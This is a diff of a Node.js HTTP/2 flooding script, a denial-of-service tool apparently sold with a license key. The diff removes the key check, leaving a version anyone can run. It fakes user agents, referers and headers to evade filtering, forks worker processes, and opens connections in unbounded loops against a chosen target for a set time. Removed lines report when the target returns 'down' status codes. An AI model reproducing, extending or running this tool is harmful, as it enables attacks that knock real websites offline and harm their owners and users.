@@ -1,21 +1,21 @@
 const http2 = require("http2")
+const fakeua = require("fake-useragent")
+const tls = require("tls")
 const cluster = require("cluster")
 const https = require("https")
 const http = require("http")
 const path = require("path")
-const key = process.argv[2]
-if ( key == "HOANGDIEULINH" ) {
-	const file = process.argv[1]
-	const name = path.basename(file)
-	const target = process.argv[3]
-	const time = process.argv[4]
-	const thread = process.argv[5]
-	const rate = process.argv[6]
-	if ( process.argv.length < 7 ) {
-		console.log("Using: node " + name + " [YourKey] [Target] [Time] [Thread] [Rate")
-		process.exit()
-	}
-	const useragent = [
+const file = process.argv[1]
+const name = path.basename(file)
+const target = process.argv[2]
+const time = process.argv[3]
+const thread = process.argv[4]
+const rate = process.argv[5]
+if ( process.argv.length < 6 ) {
+	console.log("Using: node " + name + " [Target] [Time] [Thread] [Rate")
+	process.exit()
+}
+const useragent = [
 	"Mozilla/5.0 (iPhone14,3; U; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Mobile/19A346 Safari/602.1",
 	"Mozilla/5.0 (iPhone13,2; U; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Mobile/15E148 Safari/602.1",
 	"Mozilla/5.0 (iPhone12,1; U; CPU iPhone OS 13_0 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Mobile/15E148 Safari/602.1",
@@ -25,8 +25,8 @@ if ( key == "HOANGDIEULINH" ) {
 	"Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Mobile/15A5370a Safari/604.1",
 	"Mozilla/5.0 (iPhone9,3; U; CPU iPhone OS 10_0_1 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Mobile/14A403 Safari/602.1",
 	"Mozilla/5.0 (iPhone9,4; U; CPU iPhone OS 10_0_1 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Mobile/14A403 Safari/602.1"
-	]
-	const accept_header = [
+]
+const accept_header = [
 	    '*/*',
     'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
     'application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5',
@@ -55,8 +55,8 @@ if ( key == "HOANGDIEULINH" ) {
     'text/html, text/plain; q=0.6, */*; q=0.1',
     'application/graphql, application/json; q=0.8, application/xml; q=0.7',
     'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8'
-	]
-	accept_language = [
+]
+accept_language = [
 	    "ko-KR",
     "en-US",
     "zh-CN",
@@ -83,8 +83,8 @@ if ( key == "HOANGDIEULINH" ) {
     "en-US,en;q=0.9",
     "de-CH;q=0.7",
     "tr",
-	]
-	const referer = [
+]
+const referer = [
 	"http://www.google.com",
 	"http://bing.com",
 	"http://m.facebook.com",
@@ -115,8 +115,8 @@ if ( key == "HOANGDIEULINH" ) {
 	"http:://ngocphong.space",
 	"http://onlytris.space",
 	"http://paypal.com"
-	]
-	const encoding = [
+]
+const encoding = [
 	    "*",
     "gzip, deflate",
     "br;q=1.0, gzip;q=0.8, *;q=0.1",
@@ -128,80 +128,65 @@ if ( key == "HOANGDIEULINH" ) {
     "deflate",
     "gzip, deflate, lzma, sdch",
     "deflate",
-	]
-	const lang = accept_language[Math.floor(Math.random()* accept_language.length)]
-	const ua = useragent[Math.floor(Math.random()* useragent.length)]
-	const en = encoding[Math.floor(Math.random()* encoding.length)]
-	const ref = referer[Math.floor(Math.random()* referer.length)]
-	const acp = accept_header[Math.floor(Math.random()* accept_header.length)]
-	const agent = new http.Agent({
-		KeepAlive: true,
-		KeepAliveMsecs: Infinity,
-		maxSockets: Infinity,
-		maxTotalSockets: Infinity,
-	})
-	const headers = {
-		"origin": target,
-		":method": "GET",
-		"globalAgent": agent,
-		"timeout": "5000",
-		"user-agent": ua,
-		"accept-language": lang,
-		"accept-encoding": en,
-		"referer": ref,
-	}
-	function flood() {
-		for ( let i = 0; i < rate;i++ ) {
-			const client = http2.connect(target)
-			const req = client.request(headers)
-			req.on("response", (response) => {
-				req.close()
-				req.destroy()
-				return
-			})
-			req.end()
-			if (req.statusCode === 502 ) {
-					console.log("Target is down in 502")
-				}
-				if (req.statusCode === 503 ) {
-					console.log("Target is down 503")
-				}
-				if (req.statusCode === 520 ) {
-					console.log("Target is down in 520")
-				}
-				if (req.statusCode === 525 ) {
-					console.log("Target is down in 525")
-				}
-				if ( req.statusCode === 522 ) {
-					console.log("Target is down in 522")
-				}
-				if ( req.statusCode === 403 ) {
-					console.log("Blockcon cụ nó rồi")
-				}
-			req.on("error", (error) => {
-				console.log("Vợ tui tên là nguyễn phương linh")
-				req.destroy()
-				return
-			})
-		}
-	}
-	if ( cluster.isWorker ) {
-		setInterval(() => {
-			flood()
-		})
-	}
-	else {
-		setInterval(() => {
-			flood()
-		})
-		for ( let i =0; i < thread;i++ ) {
-			cluster.fork()
-		}
-	}
-	setTimeout(() => {
-		process.exit()
-	}, time * 1000)
-} else {
-	console.log("How to use?\nnode [file] [your_key] [target] [time] [thread] [rate]\nBuy key?,dm my facebook")
-	process.exit()
+]
+const lang = accept_language[Math.floor(Math.random()* accept_language.length)]
+const ua = useragent[Math.floor(Math.random()* useragent.length)]
+const en = encoding[Math.floor(Math.random()* encoding.length)]
+const ref = referer[Math.floor(Math.random()* referer.length)]
+const acp = accept_header[Math.floor(Math.random()* accept_header.length)]
+const agent = new http.Agent({
+	KeepAlive: true,
+	KeepAliveMsecs: Infinity,
+	maxSockets: Infinity,
+	maxTotalSockets: Infinity,
+})
+const headers = {
+	":method": "GET",
+	"globalAgent": agent,
+	"timeout": "5000",
+	"user-agent": ua,
+	"accept-language": lang,
+	"accept-encoding": en,
+	"referer": ref,
 }
+const options = {
+	host: target,
+	port: 443,
+	method: "GET",
+	timeout: 5000,
+	globalAgent: agent,
+	path: "/",
+	header: headers
+}
+function flood() {
+	for ( let i = 0; i < rate;i++ ) {
+		const client = http2.connect(target)
+		const req = client.request(options)
+		req.on("response", () => {
+			req.close()
+			req.destroy()
+			flood()
+			return
+		})
+		req.on("error", (error) => {
+			req.destroy()
+			flood()
+			return
+		})
+	}
+}
+if ( cluster.isWorker ) {
+	setInterval(() => {
+		flood()
+	})
+} else {
+	setInterval(() => {
+		flood()
+	})
+	for ( let i =0; i < thread;i++ ) {
+		cluster.fork()
+	}
+}
+setTimeout(() => {
+	process.exit()
+}, time * 1000)
